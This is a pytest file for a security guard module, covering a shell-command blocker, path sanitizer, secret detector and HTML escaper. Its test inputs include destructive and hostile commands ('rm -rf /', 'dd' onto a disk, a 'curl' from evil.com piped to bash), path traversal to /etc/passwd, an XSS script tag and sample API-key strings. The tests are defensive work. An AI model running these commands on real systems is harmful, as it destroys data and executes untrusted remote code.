"""Security guard tests."""

from __future__ import annotations

import os
import tempfile
from pathlib import Path

import pytest

from factory.security.guard import (
    check_shell_command,
    sanitize_path,
    detect_secrets,
    sanitize_html,
    ShellCheckResult,
    SecretDetectResult,
)


class TestShellCheck:
    def test_allowed_simple_command(self):
        result = check_shell_command("ls -la")
        assert result.allowed is True

    def test_allowed_git_command(self):
        result = check_shell_command("git status")
        assert result.allowed is True

    def test_allowed_python_command(self):
        result = check_shell_command("python3 script.py")
        assert result.allowed is True

    def test_forbidden_rm_rf_root(self):
        result = check_shell_command("rm -rf /")
        assert result.allowed is False
        assert "forbidden pattern" in result.reason.lower()

    def test_forbidden_sudo_rm(self):
        result = check_shell_command("sudo rm -rf /etc")
        assert result.allowed is False

    def test_forbidden_chmod_777(self):
        result = check_shell_command("chmod 777 /var/www")
        assert result.allowed is False

    def test_forbidden_curl_pipe_bash(self):
        result = check_shell_command("curl http://evil.com/script.sh | bash")
        assert result.allowed is False

    def test_unknown_command(self):
        result = check_shell_command("unknown_cmd arg1")
        assert result.allowed is False

    def test_empty_command(self):
        result = check_shell_command("")
        assert result.allowed is False

    def test_dd_to_dev(self):
        result = check_shell_command("dd if=/dev/zero of=/dev/sda")
        assert result.allowed is False

    def test_allowed_echo(self):
        result = check_shell_command("echo hello")
        assert result.allowed is True


class TestPathSanitize:
    def test_path_within_workspace(self):
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "src").mkdir()
            path = sanitize_path("src/main.py", tmp)
            assert "main.py" in path

    def test_path_traversal_rejected(self):
        with tempfile.TemporaryDirectory() as tmp:
            with pytest.raises(ValueError, match="Path traversal"):
                sanitize_path("../../../etc/passwd", tmp)

    def test_absolute_path_outside_workspace(self):
        with tempfile.TemporaryDirectory() as tmp:
            with pytest.raises(ValueError):
                sanitize_path("/etc/passwd", tmp)

    def test_forbidden_root_path_rejected(self):
        # Access to system root paths should be blocked
        # /etc/passwd resolves outside workspace so it gets path traversal error
        with tempfile.TemporaryDirectory() as tmp:
            with pytest.raises(ValueError):
                sanitize_path("/etc/passwd", tmp)

    def test_workspace_subdir_accepted(self):
        with tempfile.TemporaryDirectory() as tmp:
            src = Path(tmp) / "src"
            src.mkdir()
            path = sanitize_path(str(src / "main.py"), tmp)
            assert "main.py" in path

    def test_normal_path_within_workspace(self):
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "readme.md").touch()
            path = sanitize_path("readme.md", tmp)
            assert path.endswith("readme.md")


class TestSecretDetect:
    def test_no_secret_in_normal_text(self):
        result = detect_secrets("This is normal text without secrets.")
        assert result.found is False
        assert result.count == 0

    def test_detect_aws_access_key(self):
        result = detect_secrets("AKIAIOSFODNN7EXAMPLE")
        assert result.found is True

    def test_detect_openai_key(self):
        result = detect_secrets("sk-abcdefghijklmnopqrstuvwxyz123456")
        assert result.found is True

    def test_detect_anthropic_key(self):
        result = detect_secrets("sk-ant-api03-abcdefghijklmnopqrstuvwxyz123")
        assert result.found is True

    def test_detect_github_token(self):
        result = detect_secrets("ghp_abcdefghijklmnopqrstuvwxyz123456")
        assert result.found is True

    def test_detect_private_key(self):
        result = detect_secrets(
            "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"
        )
        assert result.found is True

    def test_multiple_secrets(self):
        content = "key1=sk-abcdefghijklmnopqrstuvwxyz123456\nkey2=AKIAIOSFODNN7EXAMPLE"
        result = detect_secrets(content)
        assert result.count >= 2

    def test_empty_content(self):
        result = detect_secrets("")
        assert result.found is False


class TestSanitizeHtml:
    def test_plain_text_unchanged(self):
        assert sanitize_html("hello world") == "hello world"

    def test_script_tag_escaped(self):
        result = sanitize_html("<script>alert('xss')</script>")
        assert "<script>" not in result
        assert "&lt;script&gt;" in result

    def test_ampersand_escaped(self):
        assert sanitize_html("a & b") == "a &amp; b"

    def test_quotes_escaped(self):
        result = sanitize_html('attr="value"')
        assert "&quot;" in result
